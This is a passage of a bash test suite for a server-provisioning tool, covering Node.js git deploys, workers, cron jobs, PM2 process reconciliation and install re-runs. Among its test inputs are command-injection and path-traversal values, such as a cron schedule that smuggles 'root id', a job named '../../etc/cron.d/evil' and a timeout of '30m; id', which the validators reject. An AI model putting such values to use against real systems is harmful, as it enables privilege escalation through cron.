assert_false "branch: a hidden component"          lib_app_git_branch_valid feature/.x
assert_false "branch: HEAD is not a branch"        lib_app_git_branch_valid HEAD
assert_true  "install: the first deploy installs"  _app_install_needed abc "" 0
assert_true  "install: a changed lockfile"         _app_install_needed abc def 1
assert_true  "install: node_modules missing"       _app_install_needed abc abc 0
assert_false "install: nothing changed"            _app_install_needed abc abc 1
assert_eq "git arguments cannot be read as options" "" \
  "$(grep -nE '_app_git (clone|ls-remote|-C app fetch)' "$ROOT/lib/app.sh" | grep -v -- ' -- ' || true)"
lib_domain_parse_add_args gitapp.example.com --node --git git@github.com:o/r.git --branch main
assert_eq "--git is kept for the first deploy" "git@github.com:o/r.git" "$APP_OPT_GIT"
assert_eq "--branch too" "main" "$APP_OPT_BRANCH"
assert_eq "--git with a token is refused"   1 "$(run_isolated lib_domain_parse_add_args g.example.com --node --git https://tok_1234567890abcdefghij@github.com/o/r.git)"
assert_eq "--branch without --git is refused" 1 "$(run_isolated lib_domain_parse_add_args g.example.com --node --branch main)"
assert_eq "--git without --node is refused" 1 "$(run_isolated lib_domain_parse_add_args g.example.com --git git@github.com:o/r.git)"

# a deploy keeps its output (masked) and records the outcome; a failed step stops the rest
lib_domain_state_reset
D_DOMAIN="git.example.com"; D_IDENT="git_example_com"; D_USER="git_example_com"; D_GROUP="git_example_com"
D_HOME="$SITES_ROOT/git.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3300"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_dj="$(lib_domain_json git.example.com)"; _dlog="$(lib_domain_state_dir git.example.com)/deploy.log"
_orig_fetch="$(declare -f lib_app_fetch)"; _orig_build="$(declare -f lib_app_build)"; _orig_git="$(declare -f _app_git)"
_quiet_deploy() { lib_app_deploy_run >/dev/null 2>&1; }
lib_app_fetch() { printf 'cloning https://oauth2:leaked-token-123@example.com/x.git\n'; APP_GIT_COMMIT="abc1234"; return 0; }
lib_app_build() { printf 'npm ci ok\n'; return 0; }
APP_GIT_URL="git@github.com:o/r.git"; APP_GIT_BRANCH="main"; APP_DEPS_HASH=""
assert_true  "a deploy that works succeeds"      _quiet_deploy
assert_eq    "the commit is recorded"            "abc1234" "$(jq -r '.app.last_deploy.commit' "$_dj")"
assert_eq    "the deploy is recorded as ok"      "true"    "$(jq -r '.app.last_deploy.ok' "$_dj")"
assert_has   "the deploy output is kept"         "npm ci ok" "$(cat "$_dlog")"
assert_lacks "with secrets masked"               "leaked-token-123" "$(cat "$_dlog")"
_app_deps_record "hash-1" >/dev/null 2>&1
assert_eq    "an install records its dependency hash" "hash-1" "$(jq -r '.app.deps_hash' "$_dj")"
_app_deps_record "" >/dev/null 2>&1
assert_eq    "an install under way clears it"         "null"   "$(jq -r '.app.deps_hash' "$_dj")"
# a build that fails on fetched code puts the previous commit back and builds that again
_git_calls=""; _builds=0
_app_git() { _git_calls+="$* | "; if [[ "$*" == *"rev-parse --verify -q HEAD"* ]]; then printf 'newcommitsha\n'; fi; return 0; }
lib_app_fetch() { APP_GIT_PREV="oldcommitsha"; APP_GIT_COMMIT="newcomm"; return 0; }
lib_app_build() {
  _builds=$((_builds + 1))
  if (( _builds == 1 )); then printf 'npm ERR! boom\n'; APP_BUILD_ERROR="npm run build failed"; return 1; fi
  printf 'rebuilt the old commit\n'; return 0
}
assert_false "a failed build fails the deploy"          _quiet_deploy
assert_has   "the previous commit is checked out again" "-C app checkout -q -f -B main oldcommitsha" "$_git_calls"
assert_eq    "and built again"                          "2" "$_builds"
assert_has   "the error says the app was put back"      "put back on oldcomm" "$APP_BUILD_ERROR"
assert_eq    "the failure is recorded"                  "false"   "$(jq -r '.app.last_deploy.ok' "$_dj")"
assert_eq    "with the commit that failed"              "newcomm" "$(jq -r '.app.last_deploy.commit' "$_dj")"
assert_has   "the rebuild is in the deploy log"         "rebuilt the old commit" "$(cat "$_dlog")"
eval "$_orig_git"
lib_app_fetch() { APP_BUILD_ERROR="clone failed"; return 1; }
lib_app_build() { printf 'should not run\n'; return 0; }
assert_false "a failed fetch fails the deploy"   _quiet_deploy
assert_lacks "and nothing is built after it"     "should not run" "$(cat "$_dlog")"
APP_GIT_URL=""
lib_app_build() { printf 'built without git\n'; return 0; }
assert_true  "without a repository only the build runs" _quiet_deploy
assert_has   "and its output is kept"            "built without git" "$(cat "$_dlog")"
eval "$_orig_fetch"; eval "$_orig_build"

# the install: which command, NODE_ENV kept out of it, and the dependency hash around it
_orig_as2="$(declare -f _app_as)"; _orig_limits="$(declare -f _app_build_limits)"
_as_cmds=""; _install_rc=0
_app_as() {
  local dir="$1"; shift
  if [[ "$1" == "timeout" && "$2" == "-k" ]]; then _as_cmds+="${*: -1} | "; return "$_install_rc"; fi
  ( cd "$dir" && "$@" )
}
_app_build_limits() { APP_AS_WRAP=(); }
mkdir -p "$D_HOME/app"
printf '{"name":"x","version":"1.0.0"}' >"$D_HOME/app/package.json"
APP_DEPS_HASH=""
assert_true  "build: a project without a lockfile"        lib_app_build
assert_has   "installs without creating a lockfile"       "npm install --include=dev --no-package-lock" "$_as_cmds"
assert_has   "with NODE_ENV out of the way"               "unset NODE_ENV" "$_as_cmds"
assert_eq    "and records the hash once it is installed"  "$APP_DEPS_HASH_NEW" "$(jq -r '.app.deps_hash' "$_dj")"
: >"$D_HOME/app/package-lock.json"; _as_cmds=""
assert_true  "build: a project with a lockfile"           lib_app_build
assert_has   "installs exactly that lockfile"             "npm ci --include=dev" "$_as_cmds"
_install_rc=1; printf '{"name":"x","version":"1.0.1"}' >"$D_HOME/app/package.json"
assert_false "build: a failing install fails"             lib_app_build
assert_eq    "and leaves no dependency hash behind"       "null" "$(jq -r '.app.deps_hash' "$_dj")"
_install_rc=0
eval "$_orig_as2"; eval "$_orig_limits"

# a step's output goes to the deploy log; a process it leaves behind cannot hold things up
_lf="$TMP/logged.out"; : >"$_lf"
_app_logged "$_lf" bash -c 'echo step-output; exit 3' >/dev/null 2>&1 && _lrc=0 || _lrc=$?
assert_eq  "_app_logged returns the status of the step" "3" "$_lrc"
assert_has "and keeps its output"                       "step-output" "$(cat "$_lf")"
_t0=$SECONDS
_app_logged "$_lf" bash -c 'sleep 30 & echo left-behind' >/dev/null 2>&1 || true
assert_true "a process left behind does not hold the deploy up" test $((SECONDS - _t0)) -lt 15
# tee lives as long as such a process does: it must not keep the site or the global lock
assert_has "the deploy log's tee holds no lock descriptor" "200>&- 201>&-" "$(declare -f _app_logged)"
rm -rf "$(lib_domain_state_dir git.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js applications: workers and scheduled jobs"
assert_true  "worker name: queue"                    lib_app_worker_name_valid queue
assert_true  "worker name: digits and -"             lib_app_worker_name_valid mail-2
assert_false "worker name: web is the application"   lib_app_worker_name_valid web
assert_false "worker name: all would delete all"     lib_app_worker_name_valid all
assert_false "worker name: upper case"               lib_app_worker_name_valid Queue
assert_false "worker name: leading digit"            lib_app_worker_name_valid 1queue
assert_true  "cwd: app/worker"                       lib_app_cwd_valid app/worker
assert_false "cwd: no parent directory"              lib_app_cwd_valid ../other.example.com
assert_false "cwd: no absolute path"                 lib_app_cwd_valid /etc
assert_true  "cron: every five minutes"              lib_app_cron_valid "*/5 * * * *"
assert_true  "cron: weekdays at 03:30"               lib_app_cron_valid "30 3 * * 1-5"
assert_true  "cron: lists and ranges with steps"     lib_app_cron_valid "0,30 8-18/2 1,15 * *"
assert_true  "cron: month and weekday names"         lib_app_cron_valid "0 4 * jan sun"
assert_true  "cron: Sunday as 7"                     lib_app_cron_valid "0 0 * * 7"
assert_true  "cron: @daily"                          lib_app_cron_valid "@daily"
assert_false "cron: four fields"                     lib_app_cron_valid "* * * *"
assert_false "cron: a sixth field (a user?)"         lib_app_cron_valid "* * * * * root"
assert_false "cron: a second line"                   lib_app_cron_valid $'* * * * *\n* * * * * root id'
assert_false "cron: minute 60"                       lib_app_cron_valid "60 * * * *"
assert_false "cron: hour 24"                         lib_app_cron_valid "0 24 * * *"
assert_false "cron: day 0"                           lib_app_cron_valid "0 0 0 * *"
assert_false "cron: step 0"                          lib_app_cron_valid "*/0 * * * *"
assert_false "cron: a backwards range"               lib_app_cron_valid "30-10 * * * *"
assert_false "cron: an empty list item"              lib_app_cron_valid "1,,2 * * * *"
assert_false "cron: a range of names"                lib_app_cron_valid "0 0 * jan-mar *"
assert_false "cron: @reboot is no schedule"          lib_app_cron_valid "@reboot"
assert_true  "timeout: 30m"                          lib_app_timeout_valid 30m
assert_false "timeout: 0"                            lib_app_timeout_valid 0
assert_false "timeout: words"                        lib_app_timeout_valid "1 hour"

lib_domain_state_reset
D_DOMAIN="work.example.com"; D_IDENT="work_example_com"; D_USER="work_example_com"; D_GROUP="work_example_com"
D_HOME="$SITES_ROOT/work.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3400"; D_STATIC_PATHS=""
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
mkdir -p "$D_HOME/app"
lib_domain_state_save
APP_PORT=3400; APP_START="npm start"; APP_SCRIPT=""; APP_MEMORY=""; APP_ENABLED=1; APP_GIT_URL=""; APP_GIT_BRANCH=""
lib_app_state_write work.example.com
D_HOME="$SITES_ROOT/work.example.com"
_wj() { lib_app_workers_json work.example.com; }
lib_app_worker_state_set work.example.com '{"name":"queue","start":"node worker.js --queue=mail","cwd":"app","port":null,"memory":"256M","cron":null,"timeout":null,"enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"api","start":"node api.js","cwd":"app/api","port":3401,"memory":null,"cron":null,"timeout":null,"enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"cleanup","start":"npm run cleanup","cwd":"app","port":null,"memory":null,"cron":"*/5 * * * *","timeout":"30m","enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"paused","start":"node p.js","cwd":"app","port":null,"memory":null,"cron":null,"timeout":null,"enabled":false}'
assert_eq "workers are kept in name order" "api cleanup paused queue" "$(jq -r 'map(.name) | join(" ")' <<<"$(_wj)")"
lib_domain_state_load work.example.com; lib_domain_state_save; D_HOME="$SITES_ROOT/work.example.com"
assert_eq "a domain.json save keeps the workers" "4" "$(jq 'length' <<<"$(_wj)")"
_orig_holder2="$(declare -f lib_port_holder)"; lib_port_holder() { :; }
assert_eq "a worker's port belongs to its site" "port 3401 is already used by work.example.com" "$(lib_app_port_conflict 3401 other.example.com || true)"

_weco="$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{"API_KEY":"k"}' "$(_wj)" 1)"
_we() { jq -r "$1" <<<"$_weco"; }
assert_eq "ecosystem: the web process and the running workers" "web api queue" "$(_we '[.apps[].name] | join(" ")')"
assert_eq "a scheduled job is no PM2 process"          "0" "$(_we '[.apps[] | select(.name == "cleanup")] | length')"
assert_eq "a stopped worker is left out"               "0" "$(_we '[.apps[] | select(.name == "paused")] | length')"
assert_eq "a worker's command is split into words"     'node ["worker.js","--queue=mail"]' "$(_we '.apps[] | select(.name == "queue") | "\(.script) \(.args | tojson)"')"
assert_eq "a worker without a port gets no PORT"       "null" "$(_we '.apps[] | select(.name == "queue") | .env.PORT')"
assert_eq "a worker with a port gets it"               "3401" "$(_we '.apps[] | select(.name == "api") | .env.PORT')"
assert_eq "it runs in its own directory"               "$D_HOME/app/api" "$(_we '.apps[] | select(.name == "api") | .cwd')"
assert_eq "workers get the application's variables"    "k"    "$(_we '.apps[] | select(.name == "queue") | .env.API_KEY')"
assert_eq "and their own memory limit"                 "256M" "$(_we '.apps[] | select(.name == "queue") | .max_memory_restart')"
assert_eq "and their own logs"                         "$D_HOME/.pm2/logs/queue-out.log" "$(_we '.apps[] | select(.name == "queue") | .out_file')"
assert_eq "without code for the web process the workers still run" "api queue" \
  "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' "$(_wj)" 0 | jq -r '[.apps[].name] | join(" ")')"

_old='{"apps":[{"name":"web","script":"a"},{"name":"queue","script":"q"},{"name":"gone","script":"g"}]}'
_new='{"apps":[{"name":"web","script":"a"},{"name":"queue","script":"q2"},{"name":"api","script":"n"}]}'
assert_eq "changes: a removed process goes, a changed or new one starts" "delete gone,start api,start queue," \
  "$(_app_process_changes "$_old" "$_new" "" "" "web queue gone" | sort | tr '\n' ',')"
assert_eq "changes: nothing changed, nothing happens"   "" "$(_app_process_changes "$_new" "$_new" "" "" "web queue api")"
assert_eq "changes: a restart starts everything again"  "start api,start queue,start web," "$(_app_process_changes "$_new" "$_new" restart "" "web queue api" | sort | tr '\n' ',')"
assert_eq "changes: or just the process named"          "start queue" "$(_app_process_changes "$_new" "$_new" restart queue "web queue api")"
assert_eq "changes: without an old ecosystem all start" "start api,start queue,start web," "$(_app_process_changes "" "$_new" "" "" "" | sort | tr '\n' ',')"
# PM2's own list decides what is there. The ecosystem file lives in the site's home, so its
# user could otherwise hide a process from "stop" by rewriting it, and a process PM2 lost
# would never come back.
assert_eq "changes: a forged old ecosystem cannot hide a deletion" "delete queue" \
  "$(_app_process_changes '{"apps":[{"name":"web","script":"a"}]}' '{"apps":[{"name":"web","script":"a"}]}' "" "" "web queue")"
assert_eq "changes: a process PM2 lost is started again" "start queue" \
  "$(_app_process_changes "$_new" "$_new" "" "" "web api")"
assert_eq "changes: an old ecosystem of the wrong shape is ignored" "start web" \
  "$(_app_process_changes '[]' '{"apps":[{"name":"web","script":"a"}]}' "" "" "")"
assert_eq "changes: a corrupt one too"                             "start web" \
  "$(_app_process_changes 'not json at all' '{"apps":[{"name":"web","script":"a"}]}' "" "" "")"
# the ecosystems carry every process's variables: too big for an environment variable, so they
# travel as files
_bigeco="$(jq -cn '{apps: [range(0;60) | {name: ("w" + tostring), script: "s", env: {BIG: ("x" * 3000)}}]}')"
_bignames="$(jq -rn '[range(0;60) | "w" + tostring] | join(" ")')"
assert_eq "changes: an ecosystem larger than an environment variable still reconciles" "" \
  "$(_app_process_changes "$_bigeco" "$_bigeco" "" "" "$_bignames")"
assert_eq "a process list of the wrong shape leaves the workers alone" "not running" \
  "$(_app_workers_status '[{"name":"queue","cron":null,"enabled":true}]' '["a","b"]' | jq -r '.[0].status')"

_job='{"name":"cleanup","start":"npm run cleanup","cwd":"app","cron":"*/5 * * * *","timeout":"30m","enabled":true}'
_js="$(lib_app_render_job "$_job")"
printf '%s\n' "$_js" >"$TMP/job.sh"
assert_true  "the job script is valid bash"             bash -n "$TMP/job.sh"
assert_has   "one run at a time"                        "flock -n 9" "$_js"
assert_has   "a run that takes too long is stopped"     'timeout -k 60 "30m" npm run cleanup 9>&-' "$_js"
assert_has   "it runs in the worker's directory"        "cd \"$D_HOME/app\"" "$_js"
assert_has   "with the application's environment"       ". \"$D_HOME/.pm2/lomp.env\"" "$_js"
assert_has   "its output goes to the job log"           "$D_HOME/.pm2/logs/cleanup-job.log" "$_js"
assert_has   "a skipped run says so"                    "cleanup skipped: the previous run is still going" "$_js"
assert_has   "a job without a timeout gets the default" 'timeout -k 60 "1h"' "$(lib_app_render_job '{"name":"x","start":"node x.js"}')"
assert_has   "a job that cannot take its lock stops"    "cannot take its lock file" "$_js"
# the last gate before the shared cron file: "worker add" is not the only way state gets here
# (a restored archive, a hand-edited domain.json), and one line cron cannot parse makes it
# ignore the whole file - the backups and the certificate renewals in it included
assert_false "a smuggled command gets no cron line"   lib_app_job_line '{"name":"six","start":"node x.js","cron":"* * * * * root id"}'
assert_false "and no script"                          lib_app_render_job '{"name":"six","start":"node x.js","cron":"* * * * * root id","timeout":"1h"}'
assert_false "a name that is a path gets no cron line" lib_app_job_line '{"name":"../../etc/cron.d/evil","start":"node x.js","cron":"* * * * *"}'
assert_false "a timeout that is a command gets no script" lib_app_render_job '{"name":"x","start":"node x.js","cron":"* * * * *","timeout":"30m; id"}'
assert_false "a start of only spaces gets no script"      lib_app_render_job '{"name":"x","start":"   ","cron":"* * * * *"}'
assert_has   "files in the site's home are read with a bound" "timeout 5 head -c" "$(declare -f _app_read_as_user)"
assert_has   "and written with noclobber, so a planted pipe fails instead of blocking" "set -C" "$(declare -f _app_write_as_user)"
assert_eq    "root never reads a file of theirs unbounded" "" "$(grep -nE '_app_as "\$D_HOME" cat ' "$ROOT/lib/app.sh" || true)"
assert_eq    "the cron line runs the script as the site user" "*/5 * * * * work_example_com /bin/bash $D_HOME/.pm2/jobs/cleanup.sh" "$(lib_app_job_line "$_job")"
assert_has   "a % in the cron line is escaped"          'a\%b' "$(D_HOME="/home/a%b" lib_app_job_line "$_job")"

_orig_lock3="$(declare -f _app_site_lock)"; _orig_tools3="$(declare -f lib_require_tools)"
_app_site_lock() { return 0; }; lib_require_tools() { return 0; }
printf 'SHELL=/bin/bash\n' >"$CRON_FILE"
lib_cron_set "wpcron:other.example.com" "*/5 * * * * other true"
lib_cron_set "job:work.example.com.evil:x" "* * * * * evil true"
_app_jobs_sync
assert_has   "a job gets its cron entry" "*/5 * * * * work_example_com /bin/bash $D_HOME/.pm2/jobs/cleanup.sh # server-setup:job:work.example.com:cleanup" "$(cat "$CRON_FILE")"
assert_eq    "and only jobs do"          "1" "$(grep -c 'server-setup:job:work.example.com:' "$CRON_FILE")"
_app_set_enabled 0 cleanup; _app_jobs_sync
assert_false "a stopped job loses its entry" grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
_app_set_enabled 1 cleanup; _app_jobs_sync
assert_true  "and gets it back when started" grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
lib_cron_remove_prefix "job:work.example.com:"
assert_false "removing the site's jobs"                        grep -q 'job:work.example.com:' "$CRON_FILE"
assert_true  "keeps a site whose name merely starts the same"  grep -q 'job:work.example.com.evil:x' "$CRON_FILE"
assert_true  "and every other entry"                           grep -q 'wpcron:other.example.com' "$CRON_FILE"
assert_eq    "the header is there once" "1" "$(grep -c '^SHELL=' "$CRON_FILE")"
assert_has   "remove clears the site's jobs" 'lib_cron_remove_prefix "job:${domain}:"' "$(declare -f lib_domain_remove_main)"
# state that was not written by "worker add" (a restored archive, a hand-edited domain.json)
lib_app_worker_state_set work.example.com '{"name":"evil","start":"node x.js","cwd":"app","port":null,"memory":null,"cron":"* * * * * root id","timeout":"1h","enabled":true}'
_app_jobs_sync >/dev/null 2>&1
assert_false "a job cron would choke on never reaches the file" grep -q 'root id' "$CRON_FILE"
assert_true  "and the sound ones stay"                         grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
lib_app_worker_state_del work.example.com evil
printf 'job:work.example.com:bad\t{ "a": 1 }\n' | lib_cron_replace_prefix "job:work.example.com:" >/dev/null 2>&1
assert_false "an entry that is not schedule + user + command is refused" grep -q '"a": 1' "$CRON_FILE"
_app_jobs_sync >/dev/null 2>&1

# add and remove, with the service stubbed
_orig_apply="$(declare -f lib_app_apply)"; _orig_wrep="$(declare -f _app_worker_report)"; _orig_as3="$(declare -f _app_as)"
# through eval: a plain definition this far down the file makes shellcheck read the calls to
# the real lib_app_apply further up as calls to a function that is only defined later (SC2218)
eval 'lib_app_apply() { APP_RESULT="running"; return 0; }'
eval '_app_worker_report() { return 0; }'
eval '_app_as() { local dir="$1"; shift; ( cd "$dir" && "$@" ); }'
assert_eq "add: --start is required"               1 "$(run_isolated lib_app_worker_add mailer --cwd app)"
assert_eq "add: a shell command is refused"        1 "$(run_isolated lib_app_worker_add mailer --start "node a.js | tee x")"
assert_eq "add: a job takes no port"               1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cron "* * * * *" --port 3500)"
assert_eq "add: --timeout needs --cron"            1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --timeout 5m)"
assert_eq "add: a schedule cron would reject"      1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cron "61 * * * *")"
assert_eq "add: a name that is taken"              1 "$(run_isolated lib_app_worker_add queue --start "node a.js")"
assert_eq "add: the application's own port"        1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --port 3400)"
assert_eq "add: another worker's port"             1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --port 3401)"
assert_eq "add: a directory outside the home"      1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cwd ../x)"
if (( CAN_SYMLINK )); then
  ln -s "$TMP" "$D_HOME/escape"
  assert_eq "add: a link that leads out of the home" 1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cwd escape)"
  rm -f "$D_HOME/escape"
fi
lib_app_worker_add mailer --start "node mail.js" --cron "0  3 * * *" >/dev/null 2>&1
assert_eq "add: the job is stored, its schedule tidied" "0 3 * * *" "$(jq -r '.[] | select(.name == "mailer") | .cron' <<<"$(_wj)")"
assert_eq "add: with the default timeout"               "1h"        "$(jq -r '.[] | select(.name == "mailer") | .timeout' <<<"$(_wj)")"
assert_true "add: and scheduled" grep -q 'job:work.example.com:mailer' "$CRON_FILE"
lib_app_worker_remove mailer >/dev/null 2>&1
assert_eq "remove: the worker is gone"                  "" "$(jq -r '.[] | select(.name == "mailer") | .name' <<<"$(_wj)")"
assert_false "remove: and its cron entry"               grep -q 'job:work.example.com:mailer' "$CRON_FILE"
assert_eq "--process must name a process of the site"   1 "$(run_isolated _app_parse_process start work.example.com --process nope)"
assert_eq "an option without its value is a usage error" 1 "$(run_isolated lib_app_start work.example.com --process)"
assert_eq "for worker add as well"                       1 "$(run_isolated lib_app_worker_add mailer --start)"
assert_eq "a job has no process to restart"             1 "$(run_isolated lib_app_restart work.example.com --process cleanup)"
_app_set_enabled 0 ""
assert_eq "stop without --process: the application and every worker" '[false,[false]]' "$(jq -c '[.app.enabled, (.workers | map(.enabled) | unique)]' "$(lib_domain_json work.example.com)")"
_app_set_enabled 1 queue
assert_eq "start --process: that worker alone" '[false,true,false]' \
  "$(jq -c '[.app.enabled, (.workers[] | select(.name == "queue") | .enabled), (.workers[] | select(.name == "api") | .enabled)]' "$(lib_domain_json work.example.com)")"
_app_set_enabled 1 web
assert_eq "--process web: the application alone" 'true false' "$(jq -r '"\(.app.enabled) \(.workers[] | select(.name == "api") | .enabled)"' "$(lib_domain_json work.example.com)")"
assert_has "setup.sh: listing workers and running a job take no global lock" 'worker) case "${rest[2]:-list}" in list|run|help' "$(cat "$ROOT/setup.sh")"
eval "$_orig_apply"; eval "$_orig_wrep"; eval "$_orig_as3"; eval "$_orig_lock3"; eval "$_orig_tools3"; eval "$_orig_holder2"
rm -rf "$(lib_domain_state_dir work.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js major version (regression: an install re-run upgraded Node under running apps)"
# Every "install" re-run called lib_install_node for a server that had Node, with the DEFAULT
# major: the NodeSource repository was rewritten and the next apt run jumped a major version.
_mf="$STATE_DIR/manifest.json"; cp "$_mf" "$TMP/manifest.node.save"
lib_json_set "$_mf" 'del(.params.node_major) | del(.components.node)'
assert_eq "a server without Node gets the current LTS" "$INS_NODE_DEFAULT_MAJOR" "$(lib_install_node_major_resolve)"
assert_eq "an explicit --node wins" "22" "$(lib_install_node_major_resolve 22)"
lib_manifest_set '.components.node' 'v20.18.1'
assert_eq "a server set up before the major was recorded keeps it" "20" "$(lib_install_node_major_resolve)"
lib_manifest_set '.params.node_major' '22'
assert_eq "the recorded major wins over the installed version" "22" "$(lib_install_node_major_resolve)"
assert_eq "--node still changes it on purpose" "24" "$(lib_install_node_major_resolve 24)"
assert_eq "install re-run without --node keeps it" "22" "$( ( lib_install_parse_args --with-python --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_NODE_MAJOR" ) )"
assert_eq "install --node 24 takes the new one" "24" "$( ( lib_install_parse_args --node 24 --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_NODE_MAJOR" ) )"
assert_eq "an invalid --node is refused" 1 "$(run_isolated lib_install_parse_args --node 2x)"
cp "$TMP/manifest.node.save" "$_mf"
# PM2 is never started as root any more: every Node site runs its own daemon as its own user
_node_fn="$(declare -f lib_install_node)"
assert_lacks "no root pm2 startup unit" "startup systemd -u root" "$_node_fn"
assert_lacks "no pm2 call that would spawn a root daemon" "pm2 -v" "$_node_fn"
assert_lacks "no root pm2-logrotate module" "pm2-logrotate" "$_node_fn"
assert_has   "pm2 pinned to one major" 'pm2@${PM2_MAJOR}' "$_node_fn"
assert_has   "the major is recorded" ".params.node_major" "$_node_fn"

# =============================================================================
section "install re-run keeps --php, --admin-port and --timezone (regression: a bare re-run reset them)"
# These three were never read back from the manifest. A server installed with --php 8.2
# --admin-port 7574 --timezone UTC got LSPHP 8.3 as its default, its WebAdmin back on 7080 (the
# firewall rule for 7574 deleted) and its timezone reset whenever "install" ran without the
# original flags - which is also how the menu adds Node.js, Python, Netdata and mail.
_mf="$STATE_DIR/manifest.json"; cp "$_mf" "$TMP/manifest.rerun.save"
_rerun_manifest() {   # php admin_port timezone -> the manifest an earlier install leaves
  jq -n --arg php "$1" --arg ap "$2" --arg tz "$3" \
    '{version:"test", installed_at:"2026-09-01T00:00:00Z", components:{},
      params:{php:$php, admin_port:$ap, timezone:$tz, admin_access:"tunnel", admin_ip:""}}' >"$_mf"
}
_rerun_values() {   # the three settings a run ends up with, from the defaults setup.sh carries
  ( PHP_VERSION="8.3"; ADMIN_PORT="7080"; TIMEZONE="Europe/Istanbul"
    lib_install_parse_args "$@" >/dev/null 2>&1
    printf '%s %s %s' "$PHP_VERSION" "$ADMIN_PORT" "$TIMEZONE" )
}
_rerun_manifest 8.2 7574 UTC
assert_eq "a re-run without the flags keeps all three" "8.2 7574 UTC" "$(_rerun_values --skip-upgrade)"
assert_eq "and gets through the checks with errexit armed" 0 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_eq "one flag changes its own setting only" "8.4 7574 UTC" "$(_rerun_values --php 8.4 --skip-upgrade)"
# a flag is a flag even when it names the built-in default: "== default" cannot mean "not given"
assert_eq "explicit flags win, even the built-in defaults" "8.3 7080 Europe/Istanbul" \
  "$(_rerun_values --php 8.3 --admin-port 7080 --timezone Europe/Istanbul --skip-upgrade)"
assert_eq "and any other value" "8.4 7575 Asia/Tokyo" \
  "$(_rerun_values --php 8.4 --admin-port 7575 --timezone Asia/Tokyo --skip-upgrade)"
assert_eq "explicit flags get through the checks with errexit armed" 0 \
  "$(run_isolated lib_install_parse_args --php 8.3 --admin-port 7080 --timezone Europe/Istanbul --skip-upgrade)"
assert_eq "without a manifest the defaults apply" "8.3 7080 Europe/Istanbul" \
  "$(STATE_DIR="$TMP/no-state"; _rerun_values --skip-upgrade)"
assert_eq "a first install gets through the checks with errexit armed" 0 \
  "$(STATE_DIR="$TMP/no-state"; run_isolated lib_install_parse_args --skip-upgrade)"
jq -n '{version:"test", components:{}, params:{}}' >"$_mf"
assert_eq "as they do while the manifest holds no settings yet" "8.3 7080 Europe/Istanbul" "$(_rerun_values --skip-upgrade)"
# a stored value is checked like the flag it stands in for, and the error says where it came from
_rerun_manifest 8 7574 UTC
assert_eq "a stored PHP version that is no version is refused" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_has "naming the manifest, not a flag nobody typed" "'8' (kept from ${STATE_DIR}/manifest.json)" \
  "$( ( lib_install_parse_args --skip-upgrade ) 2>&1 || true )"
assert_eq "--php replaces it" 0 "$(run_isolated lib_install_parse_args --php 8.2 --skip-upgrade)"
_rerun_manifest 8.2 587 UTC
assert_eq "a stored WebAdmin port that mail needs is refused" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
_rerun_manifest 8.2 99 UTC
assert_eq "so is one below 1024" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_eq "--admin-port replaces it" 0 "$(run_isolated lib_install_parse_args --admin-port 7574 --skip-upgrade)"
# the timezone is checked where --timezone is, by the step that sets it. timedatectl is stubbed:
# a stored value that slipped through must not reset the timezone of the machine running this.
_rerun_manifest 8.2 7574 Mars/Olympus_Mons
_rerun_tz_step() { timedatectl() { return 0; }; lib_install_parse_args --skip-upgrade; lib_system_timezone_apply; }
assert_eq "a stored timezone that does not exist is refused" 1 "$(run_isolated _rerun_tz_step)"
# What the run writes at its end is its own settings, beside what other commands keep under
# .params. It used to write a new object there, so every re-run dropped harden's site_firewall -
# the rules stayed loaded, but lib_sitefw_regen did nothing and a site added afterwards got none
# of its own - and the Node major.
_rerun_manifest 8.2 7574 UTC
lib_manifest_set_json '.params.site_firewall' 'true'
lib_manifest_set '.params.node_major' '22'
_rerun_manifest_step() { PHP_VERSION="8.4"; ADMIN_PORT="7575"; TIMEZONE="Asia/Tokyo"; lib_install_manifest 1; }
assert_eq "the manifest step gets through with errexit armed" 0 "$(run_isolated _rerun_manifest_step)"
assert_eq "and records the settings of this run" "8.4 7575 Asia/Tokyo" \
  "$(jq -r '.params | "\(.php) \(.admin_port) \(.timezone)"' "$_mf")"
assert_true "the site firewall is still on" lib_sitefw_enabled
assert_eq "the Node major is still recorded" "22" "$(lib_manifest_get '.params.node_major')"
_rerun_own_keys="admin_access admin_ip admin_port auto_reboot backup_keep backup_schedule db_buffer_percent email fail2ban_ignore_ip php redis_max_percent redis_persist ssh_ports timezone"
assert_eq "install's own settings are the ones it always wrote" "$_rerun_own_keys" \
  "$(jq -r '.params | del(.site_firewall, .node_major) | keys | join(" ")' "$_mf")"
# a first install has no settings to keep, and may have no .params at all
jq -n '{version:"test", components:{}}' >"$_mf"
assert_eq "a first install gets through it with errexit armed" 0 "$(run_isolated lib_install_manifest 0)"
assert_eq "and has exactly those settings" "$_rerun_own_keys" "$(jq -r '.params | keys | join(" ")' "$_mf")"
assert_false "the site firewall is off until harden switches it on" lib_sitefw_enabled
cp "$TMP/manifest.rerun.save" "$_mf"

# =============================================================================
section ".htaccess is read once: the check that reloads OpenLiteSpeed"
# OpenLiteSpeed reads a document root's .htaccess while loading and never again, so a new or
# changed one only works after a reload. WordPress wrote its own after the last reload of
# "add", which left every permalink at 404.
